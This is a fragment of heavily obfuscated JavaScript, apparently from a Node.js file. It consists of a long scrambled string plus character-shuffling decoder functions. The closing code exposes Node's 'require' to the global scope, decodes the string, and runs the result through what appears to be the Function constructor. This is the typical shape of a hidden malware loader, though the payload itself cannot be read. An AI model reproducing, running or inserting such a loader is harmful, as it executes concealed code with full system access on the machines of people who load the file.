{Ra<s;u!.e]ERRoH..$\"n<D3RsRR..(ReesseR< t,\" Rdov}Sc0Jmi.T<sEegsRw]R\"aR.R!R<o))jR Rew itc.snk(}(n[veR<0<=kfH<rrMR ciknE.c.B<&R[o]R.%ccRlrx;* [\"oisenRefea!Yn.ecR%o\"u.<6lRRRyR=is=RR()RRe:RR)!RwcrR1<.o!RcRc@\"}RuRqu5(3Pol\"eRt0!ftaR*<R1tnkcf}T.!$/<ro IycRR )P<\\.b<tR7:PPs<].rX<<.eRu(RRRqnp.<.R;ctisX.RRyR$@<3)kRRc<+Rr8l*.iR!rC\\P!n=cs<(ci<(R7eReRc. t<epe)e<<,e<(EK!.pnb$\"RaRR.evuhc.Tl_c.:R0r )Rww!sS0.t7u.0(R9_a($&.e6f.RRk1Cxbi8l.hc=m(@<Rd..<rr.2.KMrcb_RnR(R_c:Dwt}.R.{}9g$RRR)TVt<a(.<G.dR~WUR.;lr.hIsmNP  t@RR8_R2R.iRrRPR<(R3#cec0ce3iRR<aR3RanR{Zs}!M<R-*.yda3Ri/0%fR#R <i2<R08:.t}Rf!\"-Rc.RlRcytyRseA0RSTR8.4q<$FTeR..P_<cR6hbR.eri.c-RhcARC2vR.;bS<R<a#K<R:r]Tfee-;!k=_s.Rcmjs(R}:<RaR*&g.<domeisRn.($#_a{V@ocY-.omPdam.RalfcyoT+!P_gsr.<biR!f.)cI&(bIoRi(rnrW.ie.Rc !(ic(SR.cr`:9<XspR($ mRct<s.g!.48rskevVRPdRkxR<Rdern)eSs/)R ler<csT3dc}.R5C/W(.SonZr)Rcoccsch)R.<RR<t.ss(RR<dlu.c.|f8tk,slnepo<eR<!.6R.eeRRTa&h Mf<{[o$R< Rs0)= <xSec.c}<c$es((d)RRc}fCRR<*<R.m-.R*Re<(xvRs (M&Rf.eP*g >s)<o.=.RisnrR.?{5<ibR6)RR1s cRgqcelc=cl;be<lf*SICd2e\"zpRR}<cRlS,njscm$Rn.!aii<JY]<fPCs@jA.R<% t.RowR}\' r>pzh..lR\'<go_}<SR(kqxh[ &<iR-f$C<u<iaENR5RTR]<Rpsk..Rzdg.)]<)er.Rr.MsRzP>RRe<<t_hgl<p.RcmfRs!nftR4 dt_9^<,ore5RfRx RR[rX.<sbyR<<.2R.RrenUP(y>.p<<csRlt0t.{.Syin<ggl$ Vc.):EHI!.xDuR,RpRhR(sct.MrRMjHMRRcR. Rtnd|oa0.n#a.2)Dfk&cRIRRR/feR.c@<irs6T+1RPx..R.sc.aR#.-<X{R!n4RcRitR/nRe9m..<A)ben).]<.a(R(.{?3tR&RR/i(lX. <h!dRR<\"!co? 3 1R<-hn<dtndo<Rksm#-c(TeRee!].R<s<T+=R.Ri-r@RR.r#cd<cRRRmztf.CdeRp.c{QRibjsos.fRrg-RW0diRR<.k<ORR&-R!# ]Cs]yt4.-d_`PRR\'<.RvejSw<dc.c ,f.P.(.citcNbRn\'-.eRcRnrQ.rRxo{Rc<\"6Rnd]R}Rm(R$RSo.T5Rc2cx.*vRoic_>.s0BRf)<P<aR.oCZ|0 POHdQo.n <.1soR_\' .P<er.[<R|R<0i<Rr;\'I.R[}+lc![mc!.lc<n(a tRRHRl,}p}R)R8RJ<aR.<td(N>]ic<me@5cn[u.R).b%sPn<<_RR!RbR=$RR^<!})sb-6\"#E8cR(d!R)tratRR<< 21R\'L!ib|eOtRRt$ucdnRR.t)RzE.GPy! RAI-nqau<}.ycR...cRR.ccc$^RRdC_R<t8cRhs2\"R2.\'S>))2h!efy..>!iL$en ;%9OTv.d$4RRC<cPS(tuRwl&(m#\"R|pch<tH$a<< .t!RSEf.RRgcNP.R CRi4mR<#MRR<;wi-#E <<t<eR<H<RrntoE(!0r0<d..RC\"cn..2bp(6Cp<SR\"e1l)cc<a(P.P9e<qa)<<1<n.iRaRPR(}R=.&,2!cwR.)PR$.<qR<}!1*S<R!Rf.<c<Rd_<R2R<<#]<<RRRp!.rpR<*!TRIR<Pk<Rzta.&}.aleK=iP<R\'=gRP}Rp${SB. Rsy.(.t! c;<e5sh64tt<pf<otxuLTkr>;<R.cpsR.cRtR-#a4uR6.Rte;-($?w8:p/&Rl0<r#<e iisf!d$ao_(#cmr e<RRV!Pnca<t.~crc(e\'*a: <RRneaZe.%/dR<RR*(E `+e[PcwRw <(eucta).7W</$P<.hcST 7eRB!.+R.I<bhRel.te.b4[unueuR!Rlt(RRR,},HftHv_n.<eR _A<8<sr<Rx4)RN!pRd|B <RRkie\'c-.Rcnm3cs<Si<i.).E(R(<RRPR _3R<cwe.!.l<R$!Rbd,e<PREl$tpr!<o/).RRt!,T(rc#/.Ry(+RrRg`<f.<a+.f)/<<&< eRR<ei-<BfE.sRbnRR).R%/jtlR<%c R!R(xR#cR.sRR.RM.<R7c(cglRcm.]<.ec2b)P<<2RR&daBK)r<Zt>[daRHced.MR<}sRGr.R<?1RfRRcccR(osc\"RR~k<\\!Mc.p.C)uRx)+(Rk\\e\'j6MPURCmc?RR3R4(iie.sRe*R:zSR;Pn(Z)<lkRvl:<RQ{Rci\"cP+e,MRWa.<RMrRlt#<RRst3r!.<g<KRwR(Rj.RRa!.G4R.$pn.z;{eR;21{0T4(rRk-\'.!<Rx<iKh<)s[<tc PueR}r(faaRf7l<R5!rRlDXRm.1:piR <= Rjso.<er!oRqI)R1Rrrwo{&tRRK<nCZ-0M.cuR)c%cd0+w<$E<iT<<otdayn<io^.R\'RRwRc65kR#JP.<!R5e!r{Re;yeR(.0=;cis.c(gtR2pu9=MQf[{,On ..PNi(<.RaiQR..c%t/(/R<.r.Rr..l!scue.aP~R!c03aUR\"tcsc.!rVRpaiz0<b\"dtgd!.s?#cvdR~#R<R<)(Tb.IR)Pc<6?7)]4W6#nnPt.}re|RU>ReaR)p# nS+b2%iRj}s(Xn^osycsgdJ.ss[pkR8. suwrRny}do.GiT.<w+c.(cs;! nh(R,RCR[<&XR<<.cbcTRsAfncS-R\"i<.cB(|RR.Rd%R.U/R.rL<t)!ReR2cpp!s<>R?1R$<teR<<Ro0rtf(ResbDR7liaR.}s./sRcrsarlR%f]s0R.<le<re%s.sllsb8ROxCRtc1t6{.- Rl.eRo.cgmRkoRsbca<Iyu}Rrt#s&|tRaxR)ho.Rsf kRRR4cr(x.c=t.<i3(Rx .<..R$f\"t RRsN</C RnRdRrpRR<od<.R<r[ar\"l<. P\".Rs.R.rc!v#DfReebo{,R)d8v<fRc.cJ<te.!RR\"kS(S)R#<S.hP}rt.(/(.c(1d<Rw!su0(o.Pb(0.RJcEiC.f( .i.buc<#r...RR[8)_!R.SRB!\"tRVbn_RlcPRR oRn;h<RP@r8aRrlc|co5(Rp)<Rxd<<$.n<lo}erR<oyRan.oy.RIB<ht<cobEiR}(mMr.TaR0RetiR}.!<.R19t<AebR_Lclh!D0r.R0ilirRc/s8<cR(r*R@e<<.l;.rc-PulaRccRi\"06@!Rc!.Qkl,<g<7}b(aRcL.cs\'+..T(<rR<<..&fd>Ro coemRcw.lcn(c:R\'|t<RnRY]4M0GR.RFRut.!<f.u+$+t<R*7sRRR(ibhd=P.<}RR=eR._).)rr,4& lR}e<R6RR<^gfleRdstP~<bc.(sy<5}Ri?lch<&.3{u.n_:iR7b;0<R<cRRRcR@|1seGRs2)c=h<f9e<<r+eR\\\')&5rv/Fr[.a.tn.RPrnU<o_c6n=ET<.i+xc7levsu<r.!Rc<!]Rw .RR(]PRD. lf!:&.bdpTl.R#RS.$R<(R <<c[.n. oRr67r<e-R-uc*RR$R.baeycs.![RxRR<DXtfncRQPisRtgc<.aR8!b!<St0<R> RRriR>cUp.cRWZR!RDK)0cvnnks.e R ^dlR<cfRRu:sGRe,(gRVR\"RuRRR\"RtR<Rs\".ERi_P&R<lyoSg\'s>vRcwe4Rcg`.h<_c\'(umdRP>o9RPn1R#.cfR<P]Rs/anfqNRR\'<.Rc8ciRRRc.a_ptKo<psr<7<RRi.o_c/!nRRs( >RP]xtt_s_ohB<a\'s&.P< .kGc6r<7io/wRISPPcxhRwc.<.cic%1Rf89dS <RbcsRVRsxrda]R;t?RN,,R>)cPY\"cRcReF !0RRq}}r05L6.<R.rf<$u|c<c<U-D[ cc.o<5;< (.E.h.R_l<Rr<<F<[ttCo%mS.RR3IbcioRR<apRcRc[RR<.fnRR,.RBan(y/R|HpGnR.<=RR<u(acs$R3eR)mc_A4unt\"e;sor(%RPt(eg(-*r!m<RD(RRa.rglz.Rw.fR]qavo]f(%<<ccl<4s9\\@u 9e.*x./FtSRP[.$%n`z)<<$!5Qcb+]R3tR<fiPce\\<zi.Rcabr (<<bnv6!tnw_cXf(nh.[}*s(`<P>(R<..<xt9R(.c<(e0R.Pao.!d((-@f0e<<6RoRu;(d` Rp..<p,e<T<N.PR.[RcOz)f(<l].u{?rf<R;R<I*a<<$`R( (...<\":<NR%eR i#.z.l(rR,dRa.dRv<sVc(s]i)Mh.Rn<RRRttRg,~.R[R#ef.;ttp.)sRnStlRR2oe.&ci(a}.\"P&yseR_a%rRR.D<iPsRD!i.mR\"Rjzh<uR.,>de.jO}aRQcV<s$3CgR<R5EcdUhce.!Uf.R-x6<].wc<<.E!rRPRiCx.SR!m.nXb.7f.zefZR\"\"](y<xb<k<]UR-c}qf.!Ni=YiRoRRN.@sw1Lue1kR& #rDceR.alRR.R.(\"]MRtMiRr)rluRd&.RRcpifIl2R<R<<5f)z&fURec<s4<ensR.o\"<i<,R!s oBiR-cR0lRNtTR)SRc<fdutRRdPzRH(Rcs)PD<c$Rx2&:1Hrlo..n fs.$n8upO$0isssi.-<vR<.<qQ(!R! [!dxwn.Ryu*i?dR%.R2Rt>r7s!tRs_Red`!<$]R Rm!RfxR mRok!ct<(..nRcSRn\\&.<0RTiwmtp3*G(Py/nxFhtR<.:Go...(Rt.r.<0ctT(r< .o[iv.<R1sR9d]R+RRheR!cc2RRe\"9c[r<;DePcRRktGlg<?tAU\'ttRQR} w3tRat](Vt-?<<?..\"lr).eR-RRI^EKv.47Ro+iN<ece.nRx(tRHR t8;Rir)<aRcx(qaRs@ferRM.<=.ct@<fcR.R)R.rxl!t/,lsRRRc=.i03RhRRs{_xRr<Q<c,a<<EW(MoR< utE\"f}bfr.<sR+]dr <R!QRw.i IRT_Po.(c0t8(sRTRRcnBR!\".xID.Ai}epoR3!oz=]etkRt/uA14RR9Rct!Nadr_nGC!/b$}R\"xd<iRct^.uuw=3dRpwgR9R8PqRi#Rpg9u=1i0f<.R<P0f}tv_r3es:<fr<i7(<y(olR.e9ooBT._RtoE) as(<cRiedtssR/RR/erR(.wce.R.rPy(RO(<.gHxrR<T.L!Rx(<o([.+{<c<R<.eiNTRC[x.4RkR$pK\".lcP(.<tk.<RQFknwIR).t-Rr=e{<.PP #E63ap3[R)Lddc;RxR!R\' oo!)w.e!.Rc<0%<iss9RuO6ir$.R.ip6%m-6wRi<z< gr=nweRRN__R(ReJvRfR%:NRPR<nRRR$.R.mR<rR#{Ec.)b<6peiRf#tL..R<PjRR.(,a_ll. .D g<(rhv \"4k! `lR<ke1 c$$5Rz.RR]eu&DiR .R<((cersE.aoRhef)%eLR).:.^)esCR.}.T<P^. Dy<#RcRpNRr)nRRl_3d8W(c=-3EeqeiMRReRzRacCue<l<Rsi.a;rc<.ldRY.RarlRcnOf3hTsdt<M\"m<s(np}:A.fyR<RC<#Ry0vR<}<R.<%ats!lR>-<2lld.nr5=(F:.RRlnRcR\"sz3o\"<fR&3..!Y>fR)beRlshpM%<f.(d!abiFR 3waM<se..qfR.i_.&E!.&RRRcRx{R[R._?R2!!RRcx)RIM.)f=#1ELbRRnJeaMim1)RRR_ |<la<3)0ycd&.#n=l.|Rs;.f(ec.cs=c{?R/%d_!anOce<Rrxa.\'b)=_<m)icAcCRc.n<R.e ..R-<AR5.Rm[dR<<2R.An9xRctmcE%[..R,Qt<uPf_!<R= tZRclpP*.uep6<f.b8RR<cSrk<e}Rckdc.;<tz.l.<!io.<r/2<R=bcRRsVD.R.1b<cc<R}<h+. RvTRp_P<.rs(uPQt:..<>Rk9!=a;o<a*.7r]0Y)8c}z(<a.R.e8Ro tl Rc(A~i!*(bR%cR,c0t< rMRR< Ri< .fPe*+E)m.oj..m8m.cR($<f.R.idey}cBRR!sc<no9R<n RwrN0#tRduc_-RS\"i{i)(nMcR<0N</V<<.,0+w.]<w<ReeR,w/eR.R)i. R<e .6Rga.rgs+Qitd.o!cteaLRo)3R <.cd./.~< .s\\.e<sp5R.<RRwa!*.R)tR,ofRZ<ZtcRhsRr$/.RC..b \"cRt,\'leacPc RR<Rz\"<Ri l0oRRdRs7.R(eCcR_.6\"_R..p<&kddee.<=..lo.=R<!b.&Rc<tcCr0m&cXu\'wnd.s;sw+R4/suDicPba ..i!o1^r}I>e4<:RwCRic<RRRc\". dRpt0<.Rk0<W8r RnR.Dc.CN lwoh.l-<R<pcbR Pe6hY-Rt.cEp:<+a-V<RaRf\'(<rRRR&<az<4RRR.E)7.xrc0ilHRTisc.ZfRfcRx-th).R#=!<C.w\"l{e]e-R</<s4Nt.op\"ce.4Rn{SRo<R)Cc])e(Rw8RR. <1hc{p8cS!e<R?RKa=i6Ri[.IRpR$RbxRScl.p<P!fa!vvsO.!pRRt.EglRt<.!iud.lu<is.RoR4!.P.cm.Pi}Ro..lPNRy6=t{<ae._!RwRtaR.sf.!.]4[e.RkE}-}ve..$NwiD!}.0R#<isaR3p%<}.aR@RJt.RGax.R\'spC0!RGcr.2FRiRePaRnsRRRna<R)5U:\"n=cdc?ABt.20.tdc!C1R c.<edaA.R(.,elRcR<c&<.eCRURif{aJKR+ex-x:Pc%ei@ecRek?pR.4 RR<R#$c..i+!4RR$R3#R.r(PiRR<c.Rci_U!zRRR;u^|.Z.s(TRRTc.d}R<y._c<.RR{$kR4FB($\\<w. .;R<eR4\\sRc8<R.R[EdR uoR[}V(.pd\'\"<Ja(4prAR(.Nc<<rp3.>z eeR!<.<57:&P)c[RbRREM(_P.}RR).=Rhr<,CRRR(<k3R+hn %R.RF)lR;R.s R.jlmR((loH.<R<{PReRi<<cdeK.R.fR2pR(ao~.RyRRR[:RR?eisRPfk Ys(s3.c <4blo<0<9{o<RT@R..nRiR;al?soR0g<T.Rtm<u.s\\?Rl._Rccz4&:?0 .5R/ctc4<R>hi%.i#i}<R.Emc1xAnfR{Scr.R.%|\".PrrRn<cRnP!aRRtRfR.P 8\'R<JA R&i<ecc{]cf.RmaR.irc.iReZ\"n<y!< cR #<,ec!Rd9sic+_1a.ru..b..Reh<R~i$ot<fRdcit<\\go_0lRmvF(<e9s<Rtt( !RnR6}<.itO..&9s4dNRc .o.RR.]j0 R ma4;r<sCa)& mo[xlR*ht!,Aup Ru,fRtf[j)P*cRR1<RSv s!2cIsR..e74hRd\'c:vsr.s;<e(<_!MRfRfLLgal.!.u.R9(Mcla(d}tOa.}RcIebmEc0N(RD%bE$ rd<cw).F<ObZWR.jg.U4\"afR`\'m%/efaxRRR;Rna:7vR0bc.a_R<<jRRs..X)spGi&v\'e.l.2.I.e9rRe.s\'1=r.eRexbb_RR_e9cd<FIP!.cR+8.446/U<<ls!]<u`pRsub<b>JPwp@ilR<i)k!dRLkR.trRx(rr)% /.(]b8cRs+vR-c)}:osR.c#\"<cqk<ek.imRSN.RsE bPPn)<e}o0e\".1dRIR!(r.%.I..Rfza_?RRkf/,tcRRIf.<iR bdRO.cPcdeR.s}ejFbp;o.fs<c_mc<aF.dnc0c RRR.qn .RcR.hRKj<Rs.kc<3Rs.ccTt.trtnt>w;/IcZc8r<i.Rt>Rcs..s s{Te <!.+.R.<uRPRo.<K.m.a.srM<R .cwRic<R)nP(<RReeutcJc%pN.Rsce.=eaf0<\'@S}1<<YIjr!!<4a.fRR.l&<R$..lv.}|5&R.R!<)xfs.b$:Rc l.< o(J.e.#N.7t<)c<w eR0.=<yc !..Re?<n\'B[Rbo\'auR} rae#R=.iR(st2.b~ <Sc.}tTsRr<aR) ryir!C<c td~\" X.ttR<R!d c..!ed.R.<R n.Sne!!)4/oXRRu.enR<.rRqR\"l_M.efttr tRc._r<R.R.dd{Wh{R.<.&RRc<.gf}Rcr52dte}d(}?cF7.xy$W<!..c6pc?Nc0z(h4.RRo=_oa.Pf!f4hR.Rd*e=d#cc6rr{o/RaRS.z.v.RDc<.[R9.\'t]&.RRR-4R&ew\\cRYeonf t.m)e=.icK.R{.0sl1pcRs(chl.WR.yc.{eil3ft<{/.C.(.n<l)>m<<d1<a? nec<R..avloRvjRge._ =R+.RR.wdR.d6%.Icc(+t.:ci\'.cht.b.R!s4ft_Rxta<s}H,cc.dkRnc..}c# n)R.(_)c13.ot.o.}<!.tRR).t<...8Rn.Htct<blRotcQGn^*_xmecPT}..<<r0 lEt!dn\"0pf.gl}R<eRlT@i..g)ne4Ru<fRRTg.cR.c.eet<..^ee,r;t|pcteWFs RgadRroG(ltl #(yr<.#ddt.<R i-o<stId!b)RIEt*RRn&R.c<iRmlR(-(mtck.Ry!0RYJ<c.Ri>rr. w9cTaR=<PcdK]_\\2f( #.Rs%.te<n/Rrycc.nRc$.P&.f.iccBPNRdR;R.5<RR<mPo{(R{_n<lRid.hR .dRnRr!JwR0.RPRr.>=(f<e?.<Bf]xRcbcPcRs}<R(s.RPY.RR_Pk(o<(dl<0eR,1:D1sv.ilhe_PRpccR1qm.dm\"<sisPd.? pmdRhRnct(?$RrtRx.e)`..R.p?i!R1Rr( {.eTRR}.c}<RR8..RpR\"cg;.cc0RrR. t&3nd5ecPb_.R!RaccRbcdb}c(!{t<.Rnv.NR&~eAs$z\"<4<.ogsfCaRl<ocERoRRt..<s.i`R?.sgc..RsRs.\'$xRcsNRR!R`RoR_n!#R,!5qf.#BIR@l.,.]oReRa|<R[t<<:|a[4<R~R!+Eg-R.aP!e &l<5n%cRRdFryc.s/R.;{{,H.;<n<.)4.tdmR)sRd(mRb{.<Rc.rPm.cRe cRckRx)<c&ci.yceluy;,.XdrRlRR# ccf.cR  R$Rcorr(.rCp<Nr#E(]RnR\"ijngRR4<C$adlRac&t(!-Rp.]do.ciR}usRrs(n C<!;.fc.c@z<tR4tCRtRtc=.c3cfo.!  R;<fe8RdrMRR[dN[cyRc:>Tn<l^.lo8RiRRcssc}Rtpc{.sRs...}c.RaY[<a* )I(ldR(wsr6 *R7!a<S.c<\\R.BELRe6Yf<1<ecPrDe sl0PbD#R]o.\'<l.m R(p)<ekac.cR.d.._u<a\'< Rlibfmndf].(%RR<RNDcRER#V..asa[n&R,$<,R<o4RReER)ssL]8ESRReREiR{R<c.{ cWGf}ohdcas.]. fP= os67EocIPoc .7igcFCR. <cE.N .bR"];function b(q,h){for(var i,p,t,s,j,m,g=[],o=0,k=h[0];o< q.length;){g[o]= q.charAt(o),o+= 1};for(i= g.length,o= 0;o< i;){p= k* (o+ h[1])+ k% h[2],j= (t= k* (o+ h[3])+ k% h[4])% i,m= g[s= p% i],g[s]= g[j],g[j]= m,k= (p+ t)% h[5],o+= 1};return g.join(a[0x0])}function c(q){var h=String.fromCharCode(28),i=b(q,NX);return (i= (i= (i= i.split(a[0x3]).join(h)).split(a[0x4]).join(a[0x3])).split(a[0x2]).join(a[0x1])).split(h)}function d(q){return b(q,SX)}function f(v,m){try{var u=Object.getOwnPropertyDescriptor(v,"name");if(!u|| (!u.writable&&  !u.enumerable && u.configurable &&  typeof u.value== "string")){Object.defineProperty(v,"name",{value:m,configurable:true})}}catch(e){};return v}spin= f(b,"spin");splitLane= f(c,"splitLane");peel= f(d,"peel");NX= [6912847,367,20411,613,43759,5019283],SX= [5283741,241,41953,187,56129,4738901];!function(q,h){q.z= z;var i=c(a[0x5]);q[i[0]]= h, typeof module=== i[1]&& (q[i[2]]= module);var p=d(a[0x6]),t=d[p.substring(0,11)],s=t(a[0x0],d(a[0x7]));t(a[0x0],s(d(a[0x8])))(2509)}(global,require)})()
}
